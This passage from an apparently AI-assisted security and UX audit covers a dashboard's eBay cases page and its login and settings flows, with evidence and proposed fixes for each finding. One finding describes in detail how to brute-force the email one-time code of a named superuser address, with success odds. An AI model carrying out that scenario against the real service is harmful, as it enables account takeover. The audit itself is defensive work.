**Failure scenario.** Meredith expands a case to read the buyer comment and the eBay options, then taps Refresh to see whether Handler acted. The card snaps shut and she has to find it again. With the periodic re-render proposed in ebay-cases-2, cards would collapse every minute.

**Proposed fix.** Before the two setHtml calls: `const openKeys = new Set([...document.querySelectorAll('#page-ebay-cases .eb-case[open]')].map(d => d.dataset.key));`. In ebCaseRow emit `<details class="eb-case" data-key="${escapeHtml(c.case_key || '').replace(/"/g,'&quot;')}"${openKeys.has(c.case_key) ? ' open' : ''}>` (pass openKeys in, or keep it in a module variable). case_key is already in the payload (worker.js:16700). Correct the comment.

<a id="ebay-cases-10"></a>
#### ebay-cases-10 — In dark mode `.dark .eb-pill` beats every pill variant, so 'Live — auto-acting' renders grey

*low · minor · ui-ux · confidence high · `index.html:5743` · unverified*

**Evidence.** index.html:5743 `.dark .eb-pill{color:rgb(var(--op-inkDim))}` has specificity (0,2,0). The variants at 5723-5726 (`.eb-pill-live{color:#dc2626...}`, `.eb-pill-shadow{color:#d97706...}`) are (0,1,0) and have no dark rule. The comment at 5718-5719 says 'every current variant overrides it', which is false in dark mode. I checked this in the browser, dark theme, effectiveMode 'LIVE': #eb-mode color was rgb(136,147,167) with border rgba(220,38,38,.45).

**Failure scenario.** Once Raj ships effectiveMode (worker.js:16557-16563 is waiting for it), the dark-mode badge that tells people the bot is spending money shows grey text inside a faint red outline, and SHADOW looks the same as OFF or unknown. The comments call LIVE 'the most dangerous direction' to get wrong.

**Proposed fix.** Scope the dark base to the neutral variants and give the coloured ones dark values:
```css
.dark .eb-pill-unknown,.dark .eb-pill-off{color:rgb(var(--op-inkDim))}
.dark .eb-pill-live{color:#f87171}    /* 6.43 op-panel, 7.16 OLED */
.dark .eb-pill-shadow{color:#fbbf24}  /* 10.65 */
```
Then replace the `.dark .eb-pill{...}` rule.

<a id="ebay-cases-11"></a>
#### ebay-cases-11 — Account chips are clickable <span>s with no keyboard access or pressed state, and the chips (28px) and Refresh (34px) are small tap targets

*low · minor · accessibility · confidence high · `index.html:31960` · unverified*

**Evidence.** index.html:31960-31961 render `<span class="eb-chip ..." onclick="ebSetAccount(...)">`, with no role, no tabindex and no aria-pressed. The selected state is shown by colour only (.eb-chip-on). CSS at 5733 is `.eb-chip{font-size:12px;padding:.25rem .625rem...}`. In the browser at 393px the chips measured 28px tall and #eb-refresh (5824, `px-3 py-1.5`) 34px. DESIGN.md §9 says clickable <span>s were converted to real <button>s and tap targets are kept at 40px or more where realistic. The Refresh button also gives no busy feedback: #eb-refresh-icon (5825) is never animated, and aria-busy is not set.

**Failure scenario.** A keyboard or switch user cannot change accounts at all, and a screen reader announces 'All' / 'shoes' as plain text with no selected state. On a phone, 28px chips spaced 6px apart are easy to mis-tap.

**Proposed fix.** Render the chips as `<button type="button" aria-pressed="...">` inside `<div role="group" aria-label="Account filter">`, using the data-acct form from ebay-cases-4. On phone add `@media (max-width:1023px){.eb-chip{min-height:40px;padding:.5rem .875rem;font-size:13px}}` and `min-h-[40px]` on #eb-refresh. In ebLoad set `btn.setAttribute('aria-busy','true')` and add `animate-spin` to #eb-refresh-icon, then clear both in finally.

<a id="ebay-cases-15"></a>
#### ebay-cases-15 — Cases with no deadline sort to the top of 'Needs action', above overdue ones

*low · minor · ui-ux · confidence high · `worker.js:16705` · unverified*

**Evidence.** worker.js:16705 is `ORDER BY respond_by ASC`. In SQLite NULLs sort first: I ran node:sqlite on ('2026-09-20…', NULL, '2026-09-25…') and got [null, '2026-09-20…', '2026-09-25…']. The page deliberately does not re-sort (index.html:32017-32018: 'Server already sorted by respond_by ASC; re-sorting here would silently diverge'). The page also has a 'No deadline' state for exactly this case (index.html:31802).

**Failure scenario.** If Handler sends a case with no respondByDate (3 of 37 live cases already lack ebayUrl and activityDue, per test-ebay-case-fields.mjs:72), it heads the 'Needs action' list in grey 'No deadline'. The '30h past deadline' red cases below it are pushed down, in a list whose whole point is urgency order.

**Proposed fix.** Worker-only and backward compatible: `ORDER BY respond_by IS NULL, respond_by ASC`. The existing 'sorted ascending' test still holds for non-null rows.

<a id="ebay-cases-16"></a>
#### ebay-cases-16 — Hours-left labels round across the tier boundaries, so '6h left' shows red or amber and '24h left' amber or green

*low · minor · ui-ux · confidence high · `index.html:31795` · unverified*

**Evidence.** index.html:31795-31799 `ebRelHours`: `if (a < 1) return Math.max(1, Math.round(a*60)) + 'm'; if (a < 48) return Math.round(a) + 'h'; ...`. The tiers at 31804-31806 are `h < 6` → crit and `h < 24` → warn. I ran the sliced functions in node: 5.99 → {eb-u-crit, '6h left'}, 23.6 → {eb-u-warn, '24h left'}, 0.995 → '60m left', -0.995 → '60m past deadline'. The worker's auto-act tier is `h > 0 && h <= autoActAt` (worker.js:9153).

**Failure scenario.** Two cases both read '6h left', one red and one amber, depending on which side of 6.0 they sit. The label does not explain the colour, and the reader cannot tell which case is inside Handler's 6-hour auto-act window. '60m left' shows up where '1h' is expected.

**Proposed fix.** For future deadlines, floor instead of rounding so the label never crosses into the next tier: `const n = h >= 0 ? Math.floor : Math.ceil;` with minutes computed as `Math.max(1, n(a*60))`, capped at 59, and hours as `n(a)`. Alternatively show 'h m' under 6 hours ('5h 40m left'), which is also the most useful precision for the auto-act window.

<a id="ebay-cases-17"></a>
#### ebay-cases-17 — Deadlines and timestamps use the device's timezone with no zone label; eBay's deadlines fall at about 3 AM ET

*low · minor · ui-ux · confidence medium · `index.html:31847` · unverified*

**Evidence.** index.html:31847-31848: `new Date(t).toLocaleString('en-US', { month: 'short', day: 'numeric', hour: 'numeric', minute: '2-digit' })`. There is no timeZone and no timeZoneName. tasks/ebay-case-handler.md:141-143: 'All 194 deadlines fall at 06:59:59 or 07:00:00 UTC … every respondByDate is ~3am Eastern.' Elsewhere the app pins ET explicitly, e.g. index.html:11636 `timeZone: 'America/New_York'`. The hours-left math itself is epoch-based and correct.

**Failure scenario.** A case due at eBay's end of day 'Sep 22' shows as 'Deadline Sep 23, 3:00 AM' on an ET phone and 'Sep 23, 12:00 AM' on a Pacific laptop (Raj or a travelling user), with nothing saying which zone. People compare notes and disagree about which day a case is due.

**Proposed fix.** In ebFmtWhen add `timeZone: 'America/New_York', timeZoneName: 'short'` (renders 'Sep 23, 3:00 AM EDT'). Use the same options for `eb-updated`.

<a id="ebay-cases-18"></a>
#### ebay-cases-18 — Failed-action banner ignores the account filter and has no time bound; on a phone the Result column is off-screen

*low · minor · ui-ux · confidence high · `index.html:31971` · unverified*

**Evidence.** index.html:31971 `const failed = ((ebData && ebData.recentActions) || []).filter(a => a.ok === 0 || a.ok === false)` uses the unfiltered list, while the table filters it (32032 `.filter(a => !ebAccount || a.account === ebAccount)`). The worker returns the latest 25 action lines regardless of age (worker.js:16757-16759 `ORDER BY ts DESC LIMIT 25`), so one failure keeps the red 'Nothing caught this after it happened' banner up until 25 newer actions push it out. It does not say when the failure happened. In the browser at 393px the table's Result header sits at x=637-777, entirely beyond the 393px viewport inside `overflow-x-auto`. The 'Action' cell prints raw `APPROVE_RETURN` while the rest of the page humanises codes with ebHumanCode.

**Failure scenario.** With the 'shoes' chip selected, the banner says '2 auto-actions failed', but the table below lists none (both were 'fashion'). On a phone, a failed row's 'Failed (500)' and its error text are hidden until the user scrolls sideways. A refund that failed three weeks ago and was since handled still paints the page red today.

**Proposed fix.** Filter `failed` with the same `ebAccount` predicate, and limit it to the last 7 days (`Date.parse(a.ts) > Date.now() - 7*864e5`). Put the most recent failure's time in the banner. In the table, move Result to the second column, or below 640px render each action as a stacked two-line row. Pass `a.action` through ebHumanCode.

<a id="ebay-cases-19"></a>
#### ebay-cases-19 — The sticky header is 230px tall on a 393px phone, 27% of the screen

*low · minor · ui-ux · confidence high · `index.html:5814` · unverified*

**Evidence.** index.html:5814 `<div class="... sticky top-0 z-10">` holds the h1, the subtitle, the mode pill, 'Loaded …', Refresh and the full Account chip row (5829-5833). With two accounts the header measured 230px tall at 393x852 in the browser. DESIGN.md §3.3 defines the sticky app bar as the 'page heading and any top-right actions (refresh, etc.)'. The filter row is not part of it.

**Failure scenario.** On a phone, with the bottom nav also taking space, less than two thirds of the screen is left for the case cards (94px each at this width). Scrolling a list of 20 or more cases is cramped, and the chip row wraps further as accounts are added.

**Proposed fix.** Move the Account row (`<div class="flex gap-1.5 ...">…#eb-acct-chips</div>`) out of the sticky block to the top of the content column above #eb-alerts. Alternatively keep the whole bar sticky only at `lg:` (`lg:sticky lg:top-0`) and let it scroll away on phones.

<a id="ebay-cases-20"></a>
#### ebay-cases-20 — Every row in 'With eBay' is painted red 'Nd past deadline', although the page says these cases cannot be resolved

*low · minor · ui-ux · confidence high · `index.html:31787` · unverified*

**Evidence.** ebCaseRow computes urgency the same way for both kinds: `const h = ebHoursLeft(c.respond_by); const u = ebUrgency(h);` (31787-31788), and renders `<span class="eb-due ${u.cls}">` (31911). Appeals sit 9-24 days past deadline by definition (tasks/ebay-case-handler.md:151-153). The section copy says 'These are appeal questions, not cases anyone can still resolve' (5861-5864), and the style block says urgency 'is the only colour that carries meaning on this page'.

**Failure scenario.** Expanding 'With eBay' shows 20 rows of bold red '12d past deadline'. That is the same alarm treatment as a genuinely overdue actionable case, and it invites exactly the triage the two-list split exists to prevent.

**Proposed fix.** In ebCaseRow: `const u = kind === 'appeal' ? { cls: 'eb-u-none', label: 'eBay deciding' } : ebUrgency(h);`. The 'Deadline' row in the card body still gives the exact date. This depends on ebay-cases-8's light override for eb-u-none.

<a id="ebay-cases-21"></a>
#### ebay-cases-21 — A staff user with an E-Commerce grant sees eBay Cases in the nav but gets 'HTTP 403', and still receives alert pushes that include dollar amounts

*low · minor · security · confidence medium · `index.html:11897` · unverified*

**Evidence.** The frontend gates only on the business: index.html:11897-11899 `if (page === 'ebay-cases') { if (!userBusinesses(currentUser).some(b => b.id === 'ecom')) return; }` and 33419-33420 for the nav item. The worker's financial gate runs before the business gate and refuses any role outside FINANCIAL_ROLES unless the action is in NON_FINANCIAL_ACTIONS or ACTION_PAGE (worker.js:14592-14606, 16582-16604). ebay-cases is in neither. index.html:11833 FINANCIAL_PAGES omits 'ebay-cases' even though the page shows 'At stake' dollars. ebayAlertRecipients (worker.js:9059-9068) selects on grant only, not role.

**Failure scenario.** A superuser gives a non-associate 'staff' account an ecom grant (the question 'what role does Meredith get' is still open per index.html:33414-33418). That user sees eBay Cases in the sidebar or menu, opens it, and gets 'Could not load cases: HTTP 403'. Meanwhile runEbayAlerts pushes them '$412.98 across 3 cases', money figures the API refuses them.

**Proposed fix.** Frontend: add 'ebay-cases' to FINANCIAL_PAGES (11833), and gate nav-ebay-cases with `canSeeFinancials(user) && userBusinesses(user).some(b => b.id === 'ecom')`, so the UI matches the worker. Worker (optional, backward compatible): add `AND u.role IN ('superuser','admin','executive','manager')` to ebayAlertRecipients, or better, fold it into the per-recipient scoping of ebay-cases-12.

<a id="ebay-cases-22"></a>
#### ebay-cases-22 — The read endpoint runs its three D1 queries one after another

*low · minor · performance · confidence high · `worker.js:16698` · unverified*

**Evidence.** worker.js:16698-16706 `await env.DB.prepare(`SELECT ... FROM ebay_cases ...`).all()`, then 16717-16720 `await env.DB.prepare(`SELECT ... FROM ebay_handler_state ...`).first()`, then 16755-16759 `await env.DB.prepare(`SELECT ... FROM ebay_actions ...`).all()`. The three queries do not depend on each other; all their binds are known before the first runs.

**Failure scenario.** Each page load or Refresh waits for three sequential D1 round trips before anything renders. On a cold worker or remote D1 replica that is a noticeable part of the delay, which ebay-cases-3 currently fills with a false alarm.

**Proposed fix.** Worker-only: `const [openRes, stRes, recentRes] = await env.DB.batch([openStmt.bind(...binds), stStmt.bind('ecom'), recentStmt.bind('ecom', ...scopeBinds)]);` then read `openRes.results`, `stRes.results[0] || null` and `recentRes.results`. The response shape is unchanged. test-ebay-cases-page.mjs and test-ebay-cases-scope.mjs cover it.

</details>

<a id="auth-settings"></a>
### Login, Settings, Accessibility, Landing, No-access

The auth-settings unit works on the happy path. Some things are already done well: associate login gives one generic answer for every failure, associates cannot enroll passkeys, the passkey list escapes device names, the theme picker is a proper radiogroup, and the Remove passkey action uses uiConfirm. The biggest risks are in the worker. auth-verify-otp has no attempt limit, and each extra auth-login leaves another code live, so the 6-digit email code of any known address, including superusers, can be brute-forced. The "sliding" 7-day session never re-sends its cookie, so everyone is signed out 7 days after they sign in. In the frontend, the no-access page hides the sidebar and bottom bar and has no Sign out of its own. An associate with no pages is therefore stuck on a shared phone for 12 hours (checked in Chromium). The notification toggles write every displayed checkbox on each change, so if the status request failed, turning one on switches off the daily email and eBay alerts (checked in Chromium). The push subscription is never removed at logout and never re-synced with the server. The history request is hard-coded to end 2026-12-31, so from January 2027 the landing page and the dashboard show no data. Also checked in Chromium: the login inputs are 14px (iOS zooms on focus), the Settings Print row squeezes its text column to 18px wide at 393px, the landing page's amber pace text is 2.15:1 in light mode, and the push Enable button is 2.66:1 in both themes.

| ID | Sev | Size | Category | Finding | Where | Verified |
|---|---|---|---|---|---|---|
| [auth-settings-1](#auth-settings-1) | high | minor | security | Email OTP can be brute-forced: no attempt limit, unlimited live codes per email, Math.random codes | `worker.js:15947` | unverified |
| [auth-settings-2](#auth-settings-2) | high | minor | bug | No-access (and landing) page has no Sign out: sidebar and bottom bar are hidden, so the account is stuck | `index.html:7064` | unverified |
| [auth-settings-6](#auth-settings-6) | high | minor | bug | History request is hard-coded to end 2026-12-31: from 1 Jan 2027 the landing figures (and the dashboard) have no rows | `index.html:8066` | unverified |
| [auth-settings-3](#auth-settings-3) | medium | minor | bug | Notification toggles send every displayed checkbox, so a failed status load plus one tap silently turns off the daily email and eBay alerts | `index.html:12262` | unverified |
| [auth-settings-4](#auth-settings-4) | medium | minor | security | Push subscription drift: logout leaves the device subscribed for the previous user, a failed save leaves the browser subscribed, and the UI trusts only local state | `index.html:12163` | unverified |
| [auth-settings-5](#auth-settings-5) | medium | minor | bug | 'Sliding' 7-day session never slides: the cookie Max-Age is set only at sign-in, so every user is logged out exactly 7 days later | `worker.js:14290` | unverified |
| [auth-settings-7](#auth-settings-7) | medium | minor | ui-ux | Offline or worker failure at launch shows 'This dashboard is invite-only' to a signed-in user | `index.html:31698` | unverified |
| [auth-settings-10](#auth-settings-10) | medium | minor | ui-ux | Email OTP field is type=number without autocomplete=one-time-code: no code autofill, no Enter, no double-submit guard, paste with a space fails | `index.html:921` | unverified |
| [auth-settings-11](#auth-settings-11) | medium | minor | ui-ux | Every login input is 14px, so iOS zooms the sign-in card on focus (and the PWA stays zoomed) | `index.html:906` | unverified |
| [auth-settings-12](#auth-settings-12) | medium | minor | ui-ux | Sign-in dead ends: the email form has no Back, and 'Check your email' has no resend or 'use a different email' | `index.html:915` | unverified |
| [auth-settings-13](#auth-settings-13) | medium | minor | accessibility | Push 'Enable' button is white on #3BB54A (2.66:1) in both themes and 28px tall | `index.html:12082` | unverified |
| [auth-settings-14](#auth-settings-14) | medium | minor | accessibility | Landing pace uses its own thresholds (<30% red, else amber) and text-accent-amber, which is 2.15:1 in light mode | `index.html:33145` | unverified |
| [auth-settings-15](#auth-settings-15) | medium | minor | bug | logout() has no error handling: offline, Sign out silently does nothing and the session stays | `index.html:33689` | unverified |
| [auth-settings-16](#auth-settings-16) | medium | minor | ui-ux | Error messages a store manager cannot act on: raw fetch/JSON/WebAuthn/Resend text, and a silently swallowed passkey failure | `index.html:33572` | unverified |
| [auth-settings-18](#auth-settings-18) | medium | minor | ui-ux | Settings 'Print dashboard' row squeezes its text column to 18px wide at phone width | `index.html:5977` | unverified |
| [auth-settings-19](#auth-settings-19) | medium | minor | ui-ux | Invite screen hides the main door: email sign-in is a 12px link 16px tall, below two large dark buttons | `index.html:879` | unverified |
| [auth-settings-22](#auth-settings-22) | medium | minor | performance | auth-me only starts after about 1.5 MB of inline JS parses and DOMContentLoaded fires, putting its round trip on every launch's critical path | `index.html:34862` | unverified |
| [auth-settings-9](#auth-settings-9) | medium | major | bug | Magic-link GET burns both the link and the OTP (same row), so a mail scanner that pre-fetches links kills both sign-in methods | `worker.js:15891` | unverified |
| [auth-settings-8](#auth-settings-8) | low | minor | ui-ux | auth_error in the URL skips auth-me: a user who double-clicked the sign-in link is signed in but sees 'That link has expired' | `index.html:31690` | unverified |
| [auth-settings-17](#auth-settings-17) | low | minor | bug | Forgot-code confirms 'Your admin has been asked' even when the request never left the phone | `index.html:33676` | unverified |
| [auth-settings-20](#auth-settings-20) | low | minor | security | Passkey assertion never checks the UV flag or a sign-count regression | `worker.js:16255` | unverified |
| [auth-settings-21](#auth-settings-21) | low | minor | ui-ux | Accessibility back chevron is a forward navigation, so swipe-back loops Settings and Accessibility | `index.html:6413` | unverified |
| [auth-settings-23](#auth-settings-23) | low | minor | ui-ux | Login card cannot scroll in short viewports: top and bottom cut off in landscape, and with the keyboard open | `index.html:868` | unverified |
| [auth-settings-24](#auth-settings-24) | low | minor | ui-ux | Settings drifts from the design system: gray-800 panels in dark (Accessibility uses op-panel), disclosures have no aria-expanded, and the radios are about 20px targets | `index.html:5976` | unverified |
| [auth-settings-25](#auth-settings-25) | low | minor | ui-ux | Landing shows '$0.00' and '● Live' before any data loads, instead of skeletons | `index.html:33197` | unverified |
| [auth-settings-26](#auth-settings-26) | low | minor | ui-ux | Remembered associate name on a shared phone: focus jumps to the code, so the next associate's code counts toward the previous one's 10-strike lockout | `index.html:33623` | unverified |
| [auth-settings-27](#auth-settings-27) | low | minor | security | renderLanding puts business name, source and unit noun into innerHTML without escaping | `index.html:33267` | unverified |

<details><summary>Details: evidence, failure scenario, proposed fix</summary>

<a id="auth-settings-1"></a>
#### auth-settings-1 — Email OTP can be brute-forced: no attempt limit, unlimited live codes per email, Math.random codes

*high · minor · security · confidence high · `worker.js:15947` · unverified*

**Evidence.** worker.js:15947-15951 `SELECT token FROM magic_links WHERE email = ? AND otp_code = ? AND expires_at > ? AND used_at IS NULL` then returns 401 `Invalid or expired code`. Nothing counts failures: no per-email or per-IP throttle anywhere in worker.js (grep for CF-Connecting-IP, request.cf and rate limit: none) and none in wrangler.toml. auth-login (worker.js:15861-15884) inserts a NEW row on every call and never invalidates older ones, so N calls leave N codes live for 15 minutes at once. Codes come from `String(Math.floor(100000 + Math.random() * 900000))` (15877), which is not a CSPRNG. The only lockout in this area is the associate PIN's PIN_MAX_FAILURES (16012); email login has no equivalent. The magic_links table has no index on email and is never cleaned, so every guess is also a full-table scan.

**Failure scenario.** The attacker knows an admin or superuser address (bhoward@bargainlane.com is printed as reply_to in every invite, worker.js:14998). They POST auth-login 10 times, leaving 10 live codes, then script POST auth-verify-otp {email, otp} through the 900,000-code space. At 100 requests/s for 15 minutes (90k guesses), P(success) is about 63% with 10 live codes and 99% with 50 (computed). The attacker gets a 7-day superuser session, which reaches the Repair console and user admin. Even with only 1 live code, each 15-minute window gives about 9.5%, and it can be repeated indefinitely.

**Proposed fix.** Worker-only and backward compatible; the frontend already shows data.error. (a) In auth-verify-otp, before the SELECT: `const k = 'otpfail:' + normalized; const n = Number(await env.SALES_SNAPSHOTS.get(k) || 0); if (n >= 5) return 429 {error:'Too many wrong codes. Request a new sign-in email.'}`. On no match: `await env.SALES_SNAPSHOTS.put(k, String(n+1), {expirationTtl: 900})`, and when n+1 >= 5 also run `UPDATE magic_links SET used_at=? WHERE email=? AND used_at IS NULL`. On success: `SALES_SNAPSHOTS.delete(k)`. (b) In auth-login, before the INSERT: `UPDATE magic_links SET used_at=? WHERE email=? AND used_at IS NULL AND otp_code IS NOT NULL` so only the newest code is live. Add a KV send throttle (e.g. 3 per 15 min per email) that still answers {ok:true}, so it reveals nothing. (c) `const otpCode = String(100000 + crypto.getRandomValues(new Uint32Array(1))[0] % 900000);`. KV is eventually consistent across colos, so the counter is approximate, but it bounds guesses to tens rather than 90k. A hard limit would need a D1 column (a migration, so major). Test on staging with a throwaway account, never a real user's email. After `wrangler deploy`, follow CLAUDE.md rule 5 (poll until consecutive clean passes).

<a id="auth-settings-2"></a>
#### auth-settings-2 — No-access (and landing) page has no Sign out: sidebar and bottom bar are hidden, so the account is stuck

*high · minor · bug · confidence high · `index.html:7064` · unverified*

**Evidence.** navigateToPage hides both nav surfaces on these pages. index.html:11930-11934: `const preApp = (page === 'landing' || page === 'no-access'); ['sidebar', 'bottom-nav'].forEach(id => { ... n.classList.toggle('hidden', preApp); });`. The only logout controls are #user-badge inside the sidebar (1160-1167) and the Menu page row (35575), which is reached only from the bottom bar. #page-no-access (7064-7078) contains only text. landingPageFor returns 'no-access' for any non-financial role and for an associate with no granted pages (32184-32189). associate-save accepts `pages: {}` (worker.js:18092-18106), and 'staff' is a grantable role (14464). In Chromium at 393px and at 1280px, for a staff user and for an associate with pages {}, no logout control has a non-zero box, and the sidebar has .hidden. The landing page likewise has no Sign out or Settings until a business is entered.

**Failure scenario.** An admin creates an associate and forgets to tick a page, or later unticks the last one. The associate signs in on the shared warehouse phone and lands on 'You're signed in, but nothing is assigned to you yet.' Nothing on screen signs out, reloading lands on the same page, and the session lasts 12 hours (worker.js:16027), so no other associate can use the phone until the session expires or someone clears site data. An email 'staff' user who signed in with the wrong account is stuck for 7 days. The copy ('doesn't have access to sales or reporting') is also wrong for an associate, who never has sales access.

**Proposed fix.** Markup only. In #page-no-access, after #no-access-who, add `<button type="button" onclick="logout()" class="mt-4 inline-flex items-center justify-center min-h-[44px] px-5 rounded-lg border border-[rgba(20,16,8,0.12)] dark:border-op-borderHi text-sm font-semibold text-opl-ink dark:text-op-ink hover:border-accent-green/50">Sign out</button>`. In the #page-landing app bar, make the inner div `flex items-center justify-between` and add the same button in compact form (text-xs, min-h-[44px]). Optionally, in applyRoleUI, when isAssociate(user) and no pages are granted, change the no-access paragraph to 'No pages have been given to you yet — ask your manager.' Verify with a browser run like probe: staff and associate-no-pages at 393 and 1280 show a visible logout control, and clicking it POSTs auth-logout.

<a id="auth-settings-6"></a>
#### auth-settings-6 — History request is hard-coded to end 2026-12-31: from 1 Jan 2027 the landing figures (and the dashboard) have no rows

*high · minor · bug · confidence high · `index.html:8066` · unverified*

**Evidence.** loadStoreFromD1: `const url = `${WORKER_BASE}?history_d1=true&store=${storeKey}&from=2025-01-01&to=2026-12-31`;` (8066). The worker applies the range verbatim (`WHERE store = ? AND date >= ? AND date <= ?`, worker.js:18607-18609). bargainLaneFigures (33078-33137) reads allStoreData for today's budget (`budget += todayRow?.bTotal`), today's auction (`todayRow?.auctionRaw`) and every MTD row. No other copy of the range exists (grep), and it is not noted in tasks/*.md. This is shared with the dashboard unit.

**Failure scenario.** On 2027-01-01 (about 100 days from today) no store has a 2027 row. The landing hero shows budget $0, pace '—', no MTD line and auction $0, and the dashboard loses every stored figure and budget with it. Nothing errors, so the numbers are simply wrong.

**Proposed fix.** Derive the end from ET today: `const y = Number(etTodayStr().slice(0,4)); const url = `${WORKER_BASE}?history_d1=true&store=${storeKey}&from=2025-01-01&to=${y + 1}-12-31`;`. Next year is included so future budget rows for the current week stay loaded. As a separate perf follow-up, `from` also grows without bound (every launch downloads all history since 2025 for every store); consider `from=${y - 1}-01-01` once LY comparisons are confirmed to need no more. Coordinate with the dashboard unit's reviewer so the fix is made once.

<a id="auth-settings-3"></a>
#### auth-settings-3 — Notification toggles send every displayed checkbox, so a failed status load plus one tap silently turns off the daily email and eBay alerts

*medium · minor · bug · confidence high · `index.html:12262` · unverified*

**Evidence.** updateNotifPrefs (12262-12286) builds `body.daily_summary = daily.checked; body.weekly_digest = weekly.checked; ... body.ebay_alerts = ebayA.checked` from whatever the checkboxes currently show. It never checks res.ok and never tells the user if the save failed. initNotifSettings (12128-12172) loads prefs only inside the try, after a first fetch. If that first fetch throws, the catch sets 'Could not load status', the checkboxes keep their HTML default (unchecked) and stay enabled. push-subscription-status is also fetched twice (12129 and 12141) for the same payload. The worker already accepts partial bodies: each field is applied only `if (typeof body.x === 'boolean')` (worker.js:21451-21459). Reproduced in Chromium with the status request failing: the panel shows 'Could not load status' with daily/weekly/supply unchecked and enabled. Ticking 'Supply request alerts' POSTed `{daily_summary:false, weekly_digest:false, supply_notifications:true, upload_alerts:false, ebay_alerts:false}`.

**Failure scenario.** An admin opens Settings → Notifications on flaky store wifi. The status request fails or times out, and every toggle looks off. They tick 'Supply request alerts'. Their stored prefs become daily_summary=0, upload_alerts=0 and ebay_alerts=0, so the 8 AM summary and the eBay 'auto-action failed' pushes stop, with no error shown. Rapid toggles can also reach the worker out of order, and because each request is a full snapshot, the older one can win.

**Proposed fix.** Frontend only; the worker needs no change. (1) Change each checkbox and radio to `onchange="updateNotifPrefs(this)"` and send only that control: map ids to columns (`{'notif-daily-summary-toggle':'daily_summary', ...}`), or `{interval_summary: src.value}` for the radios. (2) Check the response: `const r = await fetch(...); const d = await r.json().catch(()=>({})); if (!r.ok || !d.ok) throw new Error(d.error || 'Save failed')`. On failure, revert the checkbox (`src.checked = !src.checked`) and show the message in #notif-action-status. (3) In initNotifSettings, fill the prefs from the first response's `data` and delete the second fetch at 12141. Set `disabled = true` on all pref inputs before the fetch and re-enable them only after prefs are applied; if the load fails, leave them disabled with 'Couldn't load your settings — try again'.

<a id="auth-settings-4"></a>
#### auth-settings-4 — Push subscription drift: logout leaves the device subscribed for the previous user, a failed save leaves the browser subscribed, and the UI trusts only local state

*medium · minor · security · confidence high · `index.html:12163` · unverified*

**Evidence.** logout (33689-33693) never touches pushManager. The worker keeps the endpoint on the old user until some user re-POSTs it (ON CONFLICT(endpoint) DO UPDATE SET user_id, worker.js:21338-21347). initNotifSettings decides Enabled/Disable purely from `swReg.pushManager.getSubscription()` (12163-12169) and never checks that the server has this endpoint for this user. togglePushSubscription creates the browser subscription first and saves it second: `const newSub = await reg.pushManager.subscribe(...)` ... `if (!saveData.ok) throw new Error(...)` (12207-12223), without unsubscribing on failure. The realistic failure is 409 'Device cap reached (max 5)' (worker.js:21333-21335). The toggle also acts on live state, not on the label shown: the button is revealed as 'Enable' (12136-12137) before the async SW check. sw.js has no pushsubscriptionchange handler.

**Failure scenario.** (1) A manager enables pushes on the store's shared phone and signs out; an associate or another manager signs in. The phone keeps receiving the first manager's hourly '$2,170 / $6,043 −64%' sales pushes (the associate has no financial access). The new user sees 'Disable' and 'Send test', and Send test answers 'Failed: No subscriptions found for this user' (worker.js:21412-21414). (2) A user with 5 registered devices taps Enable on a 6th: the browser subscribes, the server refuses, and the next time Settings opens it shows 'Disable' and 'Send test' for a device the server will never push to. (3) Tapping 'Enable' in the few ms before the SW check can unsubscribe an existing subscription.

**Proposed fix.** Frontend only. (a) In logout, before auth-logout, best-effort with a ~2s cap: `try { const reg = await navigator.serviceWorker?.getRegistration(); const sub = await reg?.pushManager.getSubscription(); if (sub) { await fetch(`${WORKER_BASE}?action=push-unsubscribe`, {method:'POST', credentials:'include', headers:{'Content-Type':'application/json'}, body: JSON.stringify({endpoint: sub.endpoint})}); await sub.unsubscribe(); } } catch(_){}`. (b) In the subscribe path, on any error after `subscribe()`: `await newSub.unsubscribe().catch(()=>{})`. (c) In initNotifSettings, when getSubscription() returns a subscription, re-POST it to push-subscribe; the idempotent upsert moves it to the current user. Show Disable only if that returns ok, and show the 409 message otherwise. (d) Keep the toggle button disabled until the SW check settles, and pass the intended action ('enable'/'disable') rather than re-reading live state. Follow-ups: a pushsubscriptionchange handler in sw.js, and a per-device list with remove (a new worker endpoint, so major).

<a id="auth-settings-5"></a>
#### auth-settings-5 — 'Sliding' 7-day session never slides: the cookie Max-Age is set only at sign-in, so every user is logged out exactly 7 days later

*medium · minor · bug · confidence high · `worker.js:14290` · unverified*

**Evidence.** getAuthUser rolls only the D1 row: `env.DB.prepare('UPDATE sessions SET expires_at = ? WHERE id = ?').bind(new Date(rollTo).toISOString(), sessionId).run()` (14290-14295). The comment calls it 'Sliding 7-day expiry'. The cookie is `...; Max-Age=${maxAge}` (14860-14862). The only Set-Cookie emissions in worker.js are the 4 sign-in sites and logout (grep: 15930, 15973, 16034, 16280, 16322); auth-me (16071-16104) returns no cookie. The browser therefore drops the cookie 7 days after sign-in whatever the DB row says.

**Failure scenario.** A store manager signs in by email code on Monday and uses the PWA every day. The following Monday the cookie expires, auth-me returns authenticated:false, and they land on 'This dashboard is invite-only' and have to do the email/OTP flow again, every week. The DB roll that was meant to prevent this (and its own D1 write) has no effect.

**Proposed fix.** Worker-only and backward compatible. In the auth-me handler, when `user && !isAssociate(user)`, return `headers: { ...corsJson, 'Set-Cookie': sessionCookie(getSessionCookie(request, env), 7*24*60*60, env) }`. Associates keep their fixed 12-hour session. The app calls auth-me at every launch, so this refreshes the cookie at the same cadence as the DB roll. At most it outlives the DB row by under 24h, in which case auth-me simply answers unauthenticated. Pin it with a unit test in the style of scripts/test-authme-scope.js: auth-me for a non-associate carries Set-Cookie with Max-Age=604800; for an associate it carries none. Deploy with wrangler and verify the header on staging.

<a id="auth-settings-7"></a>
#### auth-settings-7 — Offline or worker failure at launch shows 'This dashboard is invite-only' to a signed-in user

*medium · minor · ui-ux · confidence high · `index.html:31698` · unverified*

**Evidence.** checkAuth (31698-31708): `try { const resp = await fetch(`${WORKER_BASE}?action=auth-me`...); const data = await resp.json(); if (data.authenticated) {...return true;} } catch (e) { /* network error — fall through to login */ } showLoginPage(); return false;`. A network failure, a 5xx or a non-JSON Cloudflare error page all fall through to the login screen. sw.js now serves the shell offline (stale-while-revalidate, sw.js:149-168), so an offline launch reliably reaches this path. There is no offline handling anywhere else (grep navigator.onLine: none).

**Failure scenario.** A manager opens the installed PWA in a stockroom with no signal. The splash gives way to 'This dashboard is invite-only. Access is granted by your administrator.' They assume they were removed or signed out, try to sign in (which also fails offline), or call an admin. Their session is actually fine.

